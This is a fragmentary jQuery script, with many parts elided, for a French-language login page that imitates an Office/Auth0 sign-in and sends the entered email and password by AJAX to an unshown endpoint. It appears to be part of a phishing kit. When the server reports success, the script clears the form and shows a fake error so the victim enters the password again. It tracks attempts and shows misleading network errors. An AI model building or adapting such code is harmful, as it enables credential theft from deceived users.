$(document).ready(function () {
    ...
    $("#sign-in-with-office").click(function () {
      ...
      var timer = setInterval(function () {
        if (officeAuth.closed) {
          $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, impossible d&acute;atteindre le serveur de téléchargement. Essayez à nouveau</span></span>').removeClass("visually-hidden");
          clearInterval(timer);
        }
      }, 250);
    ...
    $("#loginForm").submit(function (e) {
      ...
      if (!email) {
        $("#emailError").html('<div class="auth0-lock-error-invalid-hint">Vous connaissez la chanson</div>').removeClass("visually-hidden");
        $("#email").focus();
        $("#passwordError").html("").addClass("visually-hidden");
      } else if (!validateEmail(email)) {
        $("#emailError").html('<div class="auth0-lock-error-invalid-hint">Oups, ce n&acute;est pas correct. Faute de frappe?</div>').removeClass("visually-hidden");
        $("#email").focus();
        $("#passwordError").html("").addClass("visually-hidden");
      } else if (!password) {
        $("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Vous connaissez la chanson</div>').removeClass("visually-hidden");
        $("#password").focus();
        $("#emailError").html("").addClass("visually-hidden");
      } else if (password.length < 5) {
        $("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Oups, ce n&acute;est pas correct. Faute de frappe?</div>').removeClass("visually-hidden");
        $("#password").focus();
        $("#emailError").html("").addClass("visually-hidden");
      } else {
        jQuery.ajax({
          ...
          success: function (data) {
            if (data.match(/1/i)) {
              ...
              $("#email, #password").val("");
              $("#email").focus();
              $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Veuillez vous connecter avec votre compte de messagerie.</span></span>').removeClass("visually-hidden");
            } else if (data.match(/-0/i)) {
              $("#content-loading").hide();
              $("#loginCount").val("0");
              $("#password").val("").focus();
              $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Erreur. Veuillez vérifier votre réseau et réessayer.</span></span>').removeClass("visually-hidden");
            }
          },
          error: function () {
            $("#content-loading").hide();
